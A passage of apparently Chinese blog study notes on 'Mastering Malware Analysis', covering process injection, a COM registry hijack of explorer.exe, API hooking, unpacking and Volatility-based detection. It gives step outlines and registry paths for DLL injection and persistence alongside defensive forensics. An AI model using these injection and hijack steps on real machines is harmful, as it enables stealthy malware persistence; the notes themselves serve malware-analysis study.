7及以上版本中，不允许向核心Windows进程(如explorer.exe)或其他用户的进程中执行注入。然而，它仍然将代码注入当前用户的浏览器和其他进程。 这种技术合法的使用在各种终端安全产品中来检测应用程序和为了沙箱的目的（在 Understanding API hooking ​这一节中将会看到），但是这种技术也被恶意软件作者滥用。 ‍ 为什么进程注入?对于恶意软件作者来说，进程注入的好处 绕过简单的防火墙（阻止除了浏览器或其他允许的应用程序之外的所有应用程序连接互联网），通过注入代码，malware就能与C&amp;C服务器进行通信 通过在另一个未监控和未调试的进程中运行恶意代码来逃避调试器和其他动态分析或监视工具 在被注入代码的进程中Hook APIs，可以对受害者进程的行为提供唯一的控制。 保持持久性。通过将代码注入到后台进程，恶意软件可以在很少重启的服务器上保持持久性，而且不会在硬盘上留下文件。 ‍ DLL注入Windows-supported DLL注入Windows提供了特殊的注册表项，以便在满足特定条件的每个进程中加载DLL，比如 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs​ 该注册表项是恶意软件最常滥用的注册表项之一，用于将DLL代码注入其他进程并保持持久性。这里指定的库与加载user32.dll(主要用于UI的系统库)的每个进程一起加载。其实就是user32.dll会加载这个AppInit_DLLs中指定的DLL HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls​ 此注册表项中列出的库被加载到至少使用以下函数之一的每个进程中 CreateProcess CreateProcessAsUser CreateProcessWithLogonW CreateProcessWithTokenW WinExec HKEY_CURRENT_USER\\Software\\Classes&lt;AppName&gt;\\shellex\\ContextMenuHandlers​ 这个路径加载一个shell扩展(一个DLL文件)，以便向主Windows shell (explorer.exe)添加额外的功能。基本上，它可以被误用来加载恶意软件库作为explorer.exe的扩展。可以轻松地创建和修改此路径，无需任何管理特权。 原来的 ​ 新建的 ‍ ​ ‍ https://www.4hou.com/posts/M19m HKEY_CLASSES_ROOT树是HKEY_LOCAL_MACHINE和HKEY_CURRENT_USER中的注册表信息的合集。在执行合并时，Windows会给出HKCU树中的优先级。 也就是说，如果有key存在HKCU中，其优先级就高于HKLM中的相同key，也会最终合并到HKEY_CLASSES_ROOT树中。关于合并的更多说明可参见https://docs.microsoft.com/en-us/windows/desktop/sysinfo/hkey-classes-root-key。 默认情况下，explorer启动时会从HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID{90AA3A4E-1CBA-4233-B8BB-535773D48449}\\InProcServer32 key中加载Shell.dll。为了将恶意DLL加载到explorer.exe中，研究人员创建了一个HKCU\\Software\\Classes\\CLSID{90AA3A4E-1CBA-4233-B8BB-535773D48449}\\InProcServer32 key，然后将其默认值修改为恶意DLL。 ‍ 果然重启explorer.exe后他会加载这个testDll.dll，并且杀毒软件并没有报毒，有点恐怖 一个简单的DLL注入技术 找到目标进程 OpenProcess获得进程句柄 使用VirtualAllocEx，VirtualAllocExNuma, NtAllocateVirtualMemory或类似的函数分配一段空间用来要注入的DLL的路径，另外一个选项是CreateFileMapping -&gt; MapViewOfFile or CreateSectionEx -&gt; NtCreateSection的方式分配空间 使用WriteProcessMemory等api将恶意程序DLL的路径写入进程，NtWow64WriteVirtualMemory64，或者借助NtMapViewOfSection。 使用诸如 CreateRemoteThread / NtCreateThreadEx、SuspendThread -&gt; SetThreadContext -&gt; ResumeThread、QueueUserAPC /NtQueueApcThread 或者甚SetWindowHookEx 等 API 加载并执行这个 DLL，将 LoadLibraryA 的地址作为线程起始地址，将 DLL 路径的地址作为参数。 ‍ 深挖进程注入在这一节，我们将覆盖这个中级到高级的进程注入技术，这些技术不会在磁盘上留下任何痕迹，并且可以使无文件恶意软件保持持久性。 发现目标进程利用进程快照（CreateToolhelp32Snapshot）的方式，然后去遍历所有的进程, 比如下面这一段是根据NAME得到PID的 123456789101112131415161718192021DWORD GetPid(char * szName)&#123; PROCESSENTRY32 pe32 = &#123; 0 &#125;; pe32.dwSize = sizeof(PROCESSENTRY32); HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL); if (hSnapShot == INVALID_HANDLE_VALUE) &#123; printf(&quot;CreateToolhelp32Snapshot ERROR CODE: %d\\n&quot;, GetLastError()); return -1; &#125; if (Process32First(hSnapShot, &amp;pe32)) //遍历所有的进程 &#123; do &#123; if (!strcmp(szName, pe32.szExeFile)) //如果名字相同，即说明找到了，则返回进程的ID return pe32.th32ProcessID; &#125; while (Process32Next(hSnapShot, &amp;pe32)); &#125; CloseHandle(hSnapShot); return -1; //如果没有找到则返回-1&#125; 代码块注入 找到目标进程 在目标进程中准备内存 复制代码（ShellCode）到目标内存中 执行CreateRemoteThreadFunc 跟DLL注入非常的类似，最困难的工作是这个ShellCode的编写（位置独立，PE独立，就是不依赖于环境，在任何地方都能执行的代码） （第8章，Handling Exploits and Shellcode 反射性DLL注入反射式dll注入技术的优势在于可以使得恶意的dll通过 socket 等方式直接传输到目标进程内存并加载，期间无任何文件落地，安全产品的检测难度大大增加 Reflective loader 实现思路如下： 获得被注入进程未解析的 dll 的基地址，即下图第7步所指的 dll。 获得必要的 dll 句柄和函数为修复导入表做准备。 分配一块新内存去取解析 dll，并把 pe 头复制到新内存中和将各节复制到新内存中。 修复导入表和重定向表。 执行 DllMain() 函数。 ​ https://mp.weixin.qq.com/s?__biz=Mzg2NjgzNjA5NQ==&amp;mid=2247514915&amp;idx=1&amp;sn=7924af701a34f8088d56bf6a0a8dd4d5&amp;source=41#wechat_redirect 更多细节可以在后面的进程注入内存取证技术一节中找到。 Stuxnet 秘密技术-Process Hollowing其实就是傀儡进程，或者叫映像劫持，映像替换啥的。 这种机制完全的将Malware伪装成合法的程序，因为PEB和等效的EPROCESS仍然包含合法进程的信息，这有助于恶意软件绕过防火墙和内存取证工具 （这里MiniLCTF2022和2023出题都是用的这种技术。具体细节就不写了。。 ‍ 动态分析代码注入Debug it where it is假设进程A要注入ShellCode到进程B中，那么我们就阻止注入，直接在进程A中调试ShellCode, 把EIP指到ShellCode的入口位置即可。 这种方法只能调试简单的。 附加到目标进程在Malware执行CreateRemoteThread之前，附加到目标进程，或者将CreateRemoteThread的参数改为CREATE_SUSPEND 1CreateRemoteThread(Process, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibrary, (LPVOID)Memory, CREATE_SUSPENDED, NULL); 处理Process Hollowing对付这种，就是想办法找到要换的PE文件，可以在一些函数下断点 WriteProcessMemory CreateSection，MapViewOfSection 通过这样，把要Load的PE单独dump到硬盘上，然后单独运行即可。 有一些特征来识别PE文件，比如MZ头，This program cannot run in DOS mode 字符串等等 ‍ ‍ 针对进程注入的内存取证技术在本节中，我们将了解用于检测不同类型的进程注入的不同技术。将使用Volatility来进行。 ‍ 检测代码注入和反射性DLL注入​ 对于一个进程的内存，分为3种类型，MAP, IMAGE, PRIVATE MAP就是共享的内存 IMAGE就是一个可执行文件的内存映射 PRIVATE就是VirtualAlloc申请的这种 进程虚拟地址空间的页面可能处于以下状态之一。 Free 进程对这个页面没有权限访问。 Reserved 这个页面被保留以便未来使用，它没有映射到真实的内存上，但是任何其他内存分配调用都不会占用这个空间，直到它被释放。 Committed 这个页面已经分配到真实的内存当中。 检测代码注入和反射性DLL注入的原理：检测以下几种类型的内存情况，因为并不常见 有EXECUTE权限的PRIVATE内存 是READ_WRITE_EXECUTE类型的内存 ‍ 用Volatility,有一个malfind​的命令，可以检测代码注入（回头把Volatility学好了，这个图改为自己试验的图） 上面这张图是检测到了注入的PE文件在Adobe Reader process中，地址是0X3D0000，通过vaddump​命令, 在我们可以dump这个进程的所有内存。 该命令使用所谓的虚拟地址描述符(virtual Address descriptor, vad)转储进程内的所有内存区域，紧跟该进程的EPROCESS内核对象及其虚拟内存映射(及其等效物理内存页)，虚拟地址描述符只是虚拟内存与其等效物理内存之间的映射器。Vaddump​会将所有的内存区域转储到一个单独的文件中。如下图所示 ‍ 对于注入的PE文件，我们可以使用dlldump​而不是vaddump​将它们转储到磁盘(并重新构造它们的头和节，但不包含导入表)，如下面的截图所示: 检测Process Hollowing当这个恶意程序hollow out这个PE image的时候，Windows去除了内存空间和这个PE程序的何联系，所以，在这个地址处的任何分配变为PRIVATE，而且不代表任何IMAGE ‍ 这个关系的去除是在EPROCESS结构中的去除而不是PEB的去除 在Volatility中，有2个命令可以列举加载的模块 dlllist 从PEB结构体中列举（user mode）（这里其实就是检测那3个链InLoadOrderModuleList、InMemoryOrderModuleList、InInitializationOrderModuleList） ldrmodules 从EPROCESS结构体中列举（kernel mode）（这里是检测的VAD，检测Mapped File） http://akovid.blogspot.com/2014/04/difference-among-dlllistldrmodulesand.html 这两个命令之间的任何结果不匹配都可能表示Hollow Process 有多个不同类型的不匹配，他们代表不同类型的Process Hollowing 当应用程序模块未链接到其PE文件时，如图5.14所示，它表示该进程已被挖空，并且恶意软件已加载在同一位置。 当应用程序模块出现在dlllist结果中，但在ldrmodules结果中根本没有出现时，表示该进程已被挖空，并且恶意软件可能加载在另一个地址。malfind命令可以帮助我们找到新地址或使用vaddump转储该进程中的所有内存区域，并扫描它们以查找PE文件（搜索MZ魔数）。 当应用程序出现在两个命令的结果中，并与应用程序的PE文件名链接，但两个结果中模块地址不匹配时，表示应用程序并未被挖空，但恶意软件已被注入，并且PEB信息已被篡改以链接到恶意软件而不是合法应用程序PE镜像。 ‍ （上面的第二点和第三点不是很懂, 之后弄清楚了回来补） ‍ 使用HollowFind 插件来检测ProcessHollowing有一个名为HollowFind的插件可以组合所有这些命令。它会发现可疑的内存空间或进程被Hollowed-Out的证据，并返回这些结果，如下面的屏幕截图所示 ‍ ‍ 理解API HOOKingAPI hooking是恶意软件作者常用的技术，它截取Windows API调用以改变命令的输入或输出。它基于我们之前介绍的进程注入技术。 这种技术允许恶意软件作者完全控制目标进程，从而控制用户与该进程的交互体验，包括浏览器和网页、防病毒应用程序及其扫描文件等。通过控制Windows API，恶意软件作者还可以从进程内存和API参数中捕获敏感信息。由于API hooking被恶意软件作者广泛使用，因此它被合法地用于恶意软件沙箱和旧应用程序的向后兼容性等不同的合法用途。因此，Windows官方支持API hooking，正如我们将在本章后面看到的那样。 Why API hooking?有很多原因恶意软件将使用API hooking 隐藏malware存在（rootkits）：为了让恶意软件在用户和反病毒扫描程序面前隐藏它的存在，它可能会钩住以下api: Process listing APIs Process32First, Process32Next File listing APIs FindFirstFileA and FindNextFileA Registry 枚举APIs 例如 RegQueryInfoKey and RegEnumKeyEx Stealing banking details (banking Trojans): 捕获HTTP messages， 注入代码在主页面，抓取发送的username和pin codes，它通常hook下面这些APIs wininet.dll: InternetConnectA, HttpSendRequestA, InternetReadFile ws2_32.dll:WSARecv, WSASend Firefox APIs such as PR_Read, PR_Write, and PR_Close. 其他使用: HOOK CreateProcessA, CreateProcessAsUserA, and similar APIs植入子进程或者阻止启动进程 ‍ 使用API HOOKInline API hooking更改参数或者直接更改返回值(直接把eax置0，然后ret) Inline API hooking with a 跳板跳板的内容 这样的话，在HOOK函数里call跳板，然后到了API函数内部， 在API函数内部最后返回的时候ret, 就又到了HOOK函数了 这一增加的步骤使恶意软件对API及其输出有了更多的控制，例如，可以将JavaScript代码注入到InternetReadFile、PR_Read，或者API用来窃取凭据或将资金转移到不同的银行账户。 Inline API hooking with a 长度反汇编器因为不确定开头有几个字节，可能会导致jmp回来的时候跳转到了指令的中间去了，这样就会导致错误，所以需要一个轻量级的长度反汇编器来记录开头的几个字节。 检测API HOOK 用内存取证使用apihooks​命令，这个命令扫描进程库，搜索Hooked APIs(以Jmp开头或者Call开头的这种) 可以使用vaddump​dump下来，然后用IDA去分析 探索IAT HOOK修改IAT表中的函数地址。 ‍","categories":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://zzzzsky.github.io/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"MalwareAnalysis","slug":"MalwareAnalysis","permalink":"https://zzzzsky.github.io/tags/MalwareAnalysis/"},{"name":"进程注入","slug":"进程注入","permalink":"https://zzzzsky.github.io/tags/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/"}]},{"title":"《Mastering Malware Analysis》第四章","slug":"Mastering_Malware_Analysis_Chapter_4","date":"2023-02-27T06:40:00.000Z","updated":"2023-02-27T08:14:35.739Z","comments":true,"path":"2023/02/27/Mastering_Malware_Analysis_Chapter_4/","link":"","permalink":"https://zzzzsky.github.io/2023/02/27/Mastering_Malware_Analysis_Chapter_4/","excerpt":"","text":"Mastering Malware Analysis Chapter 4 识别壳 使用PEID等工具 看节的名字，比如.UPX0等 看入口点是不是不在第一个节，壳的一般入口点都在最后几个节中，第一个节的属性通常是READ| WRITE 看导入表的大小，在加了壳的程序中，导入表一般是非常的小的。 自动的脱壳 官方脱壳工具，比如UPX的，但是一般攻击者会修改几个模数使官方的工具无法脱壳，比如，修改了节表名，.UPX0改为其他的名字 OllyScript，可以对OllyScript写脚本啥的 通用的脱壳机：比如QuickUnpack（感觉要淘汰了，这个玩意 仿真（比如unipacker，一个基于Unicorn的引擎） 内存dumps 手动脱壳手动脱壳和前面提到的自动脱壳的技术主要的区别是 何时进行内存dump以及dump之后需要干什么。如果我们仅仅执行原始的样本，dump内存，然后希望unpacked的模块也可以获得的话，我们将要面对多个问题。 运行起来后IAT表都填了真实的数据，需要恢复IAT表，甚至可能处理重定位表等问题。 哈希值与原始样本不同 原始的loader可能解包样本到allocated的内存中，然后free了，导致dump的不全 很容易漏掉一些模块;例如，原来的加载程序可能只解压缩32位或64位平台的示例 因此，最好的方法就是在original 样本的OEP那里停止，因为他已经Unpack完毕，并且没有继续往下进行，在这种情况下dump修复最好。 ‍ 在执行时的内存断点这项技术仅仅适用于 unpack后的程序的imagebase和packed后的程序的Imagebase相同的情况下。正如我们知道的，packed的样本肯定包含original样本的数据，所以unpack后，控制权就是到OEP，然后程序正常执行。我们假设OEP在第一个SECTION，所以，我们设置一个断点在那里。 设置断点将第一个SECTION的属性设置为READ/WRITE, 这样就不可执行了。但是默认情况下，在多个WIndows版本中，它对于非关键进程仍然是可执行的，即使内存权限不包含EXECUTE权限，因此需要开启DEP 开启DEP高级系统设置–&gt;性能–&gt;设置–&gt;数据执行保护 现在，这个类型的断点应该就可以实施了，而且恶意软件将会被阻止在这个节执行，特别是在OEP的位置。 阻止任何更改内存权限的进一步尝试不幸的是，仅仅强制执行DEP是不够的，这个unpacking stub能够容易的绕过这个断点，通过使用VirtualProtect​这个API来改内存权限。可以在这个API下断点进行监控，如果修改的话，直接将参数设置为READONLY或者READ| WRITE即可。 执行然后到达OEP这里理论上会触发Access violation 异常，然后停在那，但是自己测试的时候并没有，而是直接终止了^（暂时不清楚是啥原因）^ 调用堆栈回溯就是在程序执行的过程中下断点，然后这个时候程序其实已经执行了一小段了，在这个地方栈回溯一点点的找，就能找到OEP 在哪个地方下断点？？？ 可以先行为监控下这个程序，比如APIMONITOR，然后在一些API那里下断点(比如 GetModuleFileNameA,GetCommandLineA, CreateFileA, VirtualAlloc, HeapAlloc, and memset), （感觉此方法不大实用 监控为unpacked 代码分配的空间这个方法还是很有用的， 监控一些API，比如 VirtualAlloc/VirtualAllocEx/VirtualAllocExNuma LocalAlloc/GlobalAlloc/HeapAlloc RtlAllocateHeap 如果分配空间很大的话，一般就是解密了，可以在分配空间那个地方下断点 当然，像UPX这种并没有调用这些API， 那是在加载的时候，操作系统会帮申请， 直接在Write的地方下断点即可 In-place unpacking（就地解包？？？）虽然不常见，但可以在示例最初所在的同一节(此节应具有写入|执行权限)或在原始文件的另一节中解密示例。 这里的意思应该是找到大的加密块，然后找哪个地方对这个加密块进行解密，通过这里，来最终定位到解密完成的地方，然后找到OEP ‍ 寻找跳转到OEP的指令一般最后跳转到OEP都是Jmp过去的，有2种 第一种是编译的时候不知道OEP的位置，所以一般是jmp eax，或jmp 某个寄存器或者jmp某个偏移 第二种是编译的时候知道了OEP的位置，但是由于是直接静态看，还没有开始unpack，所以跳转过去的指令肯定是还没有解密的，即很有可能是密文或者直接是全是0，或者未分配 ‍ （原来脱壳还能这样，感觉很有用 基于栈恢复ESP大法脱壳应该就是属于这种 ‍ DUMP unpacked的样本并且修复IATDUMP进程可以使用OD的插件，OllyDump 或者PETools（32）或Lord PE （32）或者VSD（32/64） 修复IAT为什么需要修复导入表？？？ 因为原来的导入表被填充了真实的地址，而这个地址再次加载的话不一定是正确的，所以需要修复导入表。 IAT的结构 123456789101112131415typedef struct _IMAGE_THUNK_DATA32 &#123; union &#123; DWORD ForwarderString; DWORD Function; DWORD Ordinal; //序号 DWORD AddressOfData; //指向 _IMPORT_BY_NAME &#125; u1;&#125; IMAGE_THUNK_DATA32;typedef struct _IMAGE_IMPORT_BY_NAME &#123; WORD Hint; //可能为空，编译器决定，如果不为空，是函数在导出表中的索引(不是序号) CHAR Name[1]; //函数名称，以0结尾&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; 为了恢复导入表，需要搜寻API地址s，然后用对应的名字或者序号去替换它 利用ImportREC即可 对于64位系统，the Scylla or CHimpREC tools can be used instead. 高级对称和非对称加密算法像RC4这种简单的算法，Malware会自己实现它的算法，然而像DES, AES或者RSA这种算法的实现，通常恶意软件作者不会自己去写算法，而是去调用API实现。我们需要做的是识别算法、加密/解密密钥和数据 从Windows加密APIs提取信息一些常用的API用于提供对加密算法的访问，包含DES, AES, RSA甚至是RC4加密，这些APIs是CryptAcquireContext, CryptCreateHash,CryptHashData, CryptEncrypt, CryptDecrypt, CryptImportKey, CryptGenKey,CryptDestroyKey, CryptDestroyHash,, and CryptReleaseContext (来自Advapi32.dll) 恶意软件如何使用这些API 1. 初始化并连接到加密服务提供者英文叫cryptographic service provider，即CSP，他是一个库，用来实施在Windows上的加密相关的API，对于恶意软件初始化和使用CSP中的一个的话，它执行CryptAcquireContext​API, 正如下面这样 1CryptAcquireContext(&amp;hProv,NULL,MS_STRONG_PROV,PROV_RSA_FULL,0); 能在HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider​看到所有支持的CSP 2. 准备key 把自己准备的plain text key进行hash 12CryptCreateHash(hProv,CALG_MD5,0,0,&amp;hHash);CryptHashData(hHash,secretkey,secretkeylen,0); 使用CryptDeriveKey创建session key, 从第二个参数很容易识别这个加密算法 12345CALG_DES = 0x00006601 // DES encryption algorithm.CALG_3DES = 0x00006603 // Triple DES encryption algorithm.CALG_AES = 0x00006611 // Advanced Encryption Standard (AES).CALG_RC4 = 0x00006801 // RC4 stream encryption algorithm.CALG_RSA_KEYX = 0x0000a400 // RSA public key exchange algorithm 一些恶意软件作者使用KEYBLOB结构，然后利用CryptImportKey​导入KEY 1234567891011121314151617181920typedef struct KEYBLOB &#123; BYTE bType; // 类型 PLAINTEXTKEYBLOB (0x8) PRIVATEKEYBLOB (0x7) PUBLICKEYBLOB (0x6) BYTE bVersion; WORD reserved; ALG_ID aiKeyAlg; //aiKeyAlg就是具体的加密算法类型，是上面的2中的类型，比如0X6601代表CALG_DES DWORD KEYLEN; //key的长度 BYTE[] KEY; //真正的KEY&#125;// ******************比如下面************************BYTE DesKeyBlob[] = &#123; 0x08, //代表PLAINTEXTKEYBLOB 0x02, //版本0x00,0x00, //保留0x01,0x66,0x00,0x00, //CALG_DES// BLOB header 是上面8个字节0x08,0x00,0x00,0x00, // key length, in bytes0xf1,0x0e,0x25,0x7c,0x6b,0xce,0x0d,0x34 // DES key with parity&#125;; 3. 加密或解密数据12CryptEncrypt(hKey,NULL,1,0,cyphertext,ctlen,sz);CryptDecrypt(hKey,NULL,1,0,plaintext,&amp;ctlen); 4. 释放内存这是最后一步，利用CryptDestroyKey​ 释放内存和所有的句柄 Cryptography API: Next Generation (CNG)这是被微软实施的新一代的APIs，虽然在恶意软件中还没有广泛使用，但它们更容易理解并从中提取信息。 具体使用↓ 1234BCryptOpenAlgorithmProvider(&amp;hAesAlg, BCRYPT_AES_ALGORITHM, NULL, 0) //1. 初始化加密算法提供者BCryptGenerateSymmetricKey(hAesAlg, &amp;hKey, pbKeyObject,cbKeyObject, (PBYTE)SecretKey, sizeof(SecretKey), 0) //2. 准备keyBCryptEncrypt(hKey, pbPlainText, cbPlainText, NULL, pbIV, cbBlockLen, NULL, 0, &amp;cbCipherText, BCRYPT_BLOCK_PADDING) //3. 加密数据BCryptCloseAlgorithmProvider， BCryptDestroyKey， HeapFree //4. 清理工作 加密技术在现在恶意软件中的应用–Vawtrak银行木马在这里，我们将研究恶意软件代码中用于混淆和隐藏恶意密钥特征的这些加密算法的其他实现。这些关键特征可用于使用静态签名甚至网络签名来识别恶意软件家族。 在本节中，我们将了解一种名为Vawtrak的已知银行木马。我们将看到这个恶意软件家族如何加密它的字符串和API名称，并混淆它的网络通信。 字符串和API名字加密。。。这里用了个很简单的加密算法，就不看了。打CTF遇到过类似的，就是把字符串和API全都加密存起来，用的时候再解密，然后通过LoadLibrary加载需要的库，通过GetProcAddress来获取所用的函数的地址。 ‍ 网络流量加密没有什么好的方法去识别加密算法，只能是对一些网络发包或者收包的API进行下断点（HttpAddRequestHeadersA），然后追踪，打CTF的时候分析过这种。比如下面这个题， https://www.52pojie.cn/thread-1551240-1-1.html 使用IDA来解密和脱壳IDA tips和tricks 使用FindCrypt​, IDAscope​, or IDA Signsrch​可以识别加密算法，或者使用capa​这个工具，capa是纯静态的 了解到D810​这个插件，可以去混淆 恶意软件经常使用一些开源库，比如OpenSSL，这是静态连接到程序里的，去分析这些函数很浪费时间，所以可以生成一些sig文件，这样IDA就会自动的识别出函数名字来。 诸如FLIRTDB和sig-database之类的开源项目为许多操作系统的OpenSSL库提供了FLIRT签名，FLIRT的全程是Fast Library Identification and Recognition Technology 先生成一个.lib文件 从官网下载Flair的程序，里面包含一系列的工具，比如生成PAT的，以及sigmake工具等 使用pcf生成PAT文件，使用sigmake将PAT变为sig文件，把它放到ida的sig目录下 Go to View | Open subviews | Signatures (the Shift + F5 hotkey). 就可以用了 创建自定义FLIRT签名的另一个流行选项是idb2pat工具。 默认情况下，IDA在打开文件时运行自动分析，这意味着以后解密的任何代码都不会被分析（比如SMC这种）。可以点击IDA的左下角进行重新分析。 funcap​这个插件可以记录运行时各个函数的参数，注释的形式添加进去 ‍","categories":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://zzzzsky.github.io/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"MalwareAnalysis","slug":"MalwareAnalysis","permalink":"https://zzzzsky.github.io/tags/MalwareAnalysis/"},{"name":"脱壳","slug":"脱壳","permalink":"https://zzzzsky.github.io/tags/%E8%84%B1%E5%A3%B3/"}]},{"title":"《Mastering Malware Analysis》第三章","slug":"Mastering_Malware_Analysis_Chapter_3","date":"2023-02-24T01:40:00.000Z","updated":"2023-02-26T09:56:54.745Z","comments":true,"path":"2023/02/24/Mastering_Malware_Analysis_Chapter_3/","link":"","permalink":"https://zzzzsky.github.io/2023/02/24/Mastering_Malware_Analysis_Chapter_3/","excerpt":"","text":"Mastering Malware Analysis Chapter 3 ‍ PE部分之前学PE文件结构一直忽视了这个Rich头 ​ 通过Rich字符定位这个结构，Rich后紧跟的是一个校验和，他后面紧跟着的是XOR key，可以用它来解密Rich头的内容，一旦解密，就会包含编译这个程序的软件 的 各种各样的信息。 使用PE头信息用于静态分析PE文件得到什么信息取决于需要回答什么问题。 怎样使用PE头来进行事件处理Is this malware packed?看节表的内容（比如UPX0等）或者导入表的数据（通常加了壳的会含有极少的API） ‍ Is this malware a dropper or a downloader?用Resource Hacker看资源表的数据，观察导入表中的函数，比如URLDownloadToFile或者ShellExecuteA等API ‍ Does it connect to the Command &amp; Control server(s) (C&amp;C, or the attacker’s website)? And how?还是看API，比如send, socket等 ‍ What other functionalities does this malware have?出现FindFirstFileA可能是勒索病毒 出现Process32First, Process32Next，CreateRemoteThread可能是进程植入 出现TerminateProcess可能意味着需要终止应用程序，比如反病毒软件啥的 怎样使用PE头来进行威胁狩猎？When was this sample created?TimeDateStamp可以回答这个问题，不过他有可能被伪造，另一个鲜为人知的具有类似用途的字段是Export Directory(可用时)的TimeDateStamp值。 What’s the country of origin of these attackers?可以通过TimeDateStamp来推断，因为大多数的情况下，是特定时区的9点-下午5点工作 Is malware signed with a stolen certificate? Are all these samples related?数据目录表的一项与证书相关。一些应用程序由供应商签名了，但这些证书有时会被不同的恶意软件窃取和使用。 对于所有使用特定被盗证书的恶意样本s，它们很可能都是由同一参与者生成的。即使它们有不同的目的或针对不同的受害者，它们也可能是同一攻击者执行的不同活动。 PE加载和进程创建进程是什么？进程不仅仅是一个运行的应用程序的代表，他还是一个容器，包含所有的关于这个应用程序的信息。（英文书就是牛逼，这里说的通俗易懂） 这个容器存储着关于和这个进程相关的虚拟内存的信息，所有加载的DLLs， 打开的文件和socket，作为进程一部分的线程列表，进程ID等等等。 进程是内核中保存所有这些信息的结构，它作为一个实体来表示这个正在运行的可执行文件 线程线程不仅仅是表示进程内部执行路径的实体(每个进程可以有一个或多个线程同时运行)。它也是内核中保存整个执行状态的结构，包括寄存器、堆栈信息和最后一个错误。 Windows中的每个线程在停止运行以恢复另一个线程之前都有一个小的时间框架(因为处理器内核的数量远远小于整个系统中运行的线程数量)。 当Windows将执行从一个线程更改到另一个线程时，它会对整个执行状态(寄存器、堆栈、指令指针等)进行快照，并将其保存在线程结构中，以便能够从停止的位置再次恢复它。 每一个线程都有1个栈，指令指针，错误处理函数，线程ID和TEB，如下图所示 ​ 进程创建 启动程序: ​当双击某个程序的时候，explorer.exe调用CreateProcess来请求操作系统创建进程和开始执行。 创建进程数据结构: ​在内核空间中创建EPROCESS，设置PID和PPID 初始化虚拟内存: ​Windows创建进程，准备虚拟内存，在EPROCESS中保存映射，然后创建PEB，加载2个DLL，ntdll.dll和kernel32.dll 加载PE文件: ​在那之后，Windows开始加载PE文件，加载所有要求的第三方DLLS，以及这些DLL需要的DLL，确保能发现APIs，然后保存地址在导入表当中。 开始执行：Windows创建了第一个线程，他做了许多初始化的工作然后CALL PE文件的Entry Point，TLS callback如果有的话，将会在Entry Point前执行 WOW64 process32位的程序如何运行在64位的操作系统上 对于这种特殊情况，Windows创建了所谓的WOW64子系统。主要在以下dll中实现: •wow64.dll •wow64cpu.dll •wow64win.dll 这些dll为32位进程创建模拟环境，其中包括它可能需要的32位版本的库 ​ 另外 IsWow64Process 这个API可以用来判断32位的程序是运行在X86环境下还是X64环境下 ‍ 调试恶意服务What is a service?服务是一些在后台执行一定的逻辑的任务，类似于linux的守护进程，所以为了保持持久性，恶意软件作者使用它也不足为奇。 服务由SCM（Service Control Manager）控制，它是在%SystemRoot%\\System32\\services.exe​.中，所有的服务都有对应的HKLM\\SYSTEM\\CurrentControlSet\\services&lt;service_name&gt;​键，它包含各种各样的值来描述这个服务，比如下图。 ​ ImagePath: 和相应的参数绑定的可执行文件的路径 Type: 服务的类型 0x01(kernel) 在这种情况下，逻辑是在一个驱动程序中实现的(将在第7章“理解内核模式Rootkits”中详细介绍，该章节专门针对内核模式威胁)。 0x10(own)这个服务运行在他自己的进程中 0X20（share）服务运行在共享进程中 Start: 这世描述服务应该怎样启动的 0X00（boot）和0X01（system）这些值用于驱动程序，在这种情况下，它们将分别由Boot Loader或者内核初始化期间加载。 0X02（auto）该服务将在每次机器重新启动时自动启动，这是恶意软件的明显选择。 0X03（demand) 指定应该手动启动的服务，这个选项对于调试特别有用。 0x04 (disabled): 服务不启动。 ‍ 服务被设计的几种方式 As an executable: 是一个executable文件，完整路径保存在ImagePath中 As a DLL(own loader)，是一个DLL，有自己的loader(是一个自定义程序或者标准的，比如rundll32.exe) 完整的命令行保存在ImagePath中 As a DLL(svchost) svchost.exe加载这个DLL, 为了被加载，恶意软件在HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost​中创建新组，把它的值通过-k参数传递给svchost.exe中，ImagePath存的是svchost.exe及其 ，DLL存在HKLM\\SYSTEM\\CurrentControlSet\\services&lt;service_name&gt;\\Parameters​中的ServiceDll ​​中, 这个ServiceDll应该包含ServiceMain导出函数，如果使用自定义名称，则应在ServiceMain注册值中指定，如果SvchostPushServiceGlobals导出存在，它将在ServiceMain之前执行。 ​ ​ ​ ‍ Attaching to services有很多方式Attach到服务上一旦他们启动 创建一个专门的注册表键，HKLM\\SOFTWARE&lt;br /&gt;Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options&lt;filename&gt;​ l里面有个值是Debugger，是调试器的路径全程，一旦这个 启动时，这个Debugger就会附加上去。这里需要注意就是，如果这个服务不是interactive的话，这个Debugger可能不会出现，但是可以用以下的方法解决 services.msc找到该服务，然后从属性中找到这个框勾上即可。 HKLM\\SYSTEM\\CurrentControlSet\\services&lt;service_name&gt;​中值 OR 0X100 sc的时候加上type= interact参数即可 使用GFlags(Global Flags Editor) 子进程调试 Patch入口点，使其无限循环，然后再Attach 需要注意的是，服务在一定时间内如果没有执行成功，可能会被KILL，有个时间限制在HKLM\\SYSTEM\\CurrentControlSet\\\\Control​中 ‍ 行为分析要点这种方法允许研究人员快速了解恶意软件的功能。然而，与之相关的局限性有很多，如下。 恶意软件可能仅仅执行了它功能的一部分。 恶意软件可能表现出不同的行为当他检测出自己正在被分析的时候。 在大多数情况下，行为分析工具可以很容易地通过各种特征检测到:文件、进程或目录名称、注册表键和值、互斥对象、窗口名称，等等。 现在，让我们看看最常用的工具，按类型对它们进行分组。 文件操作Process Monitor (Filemon) 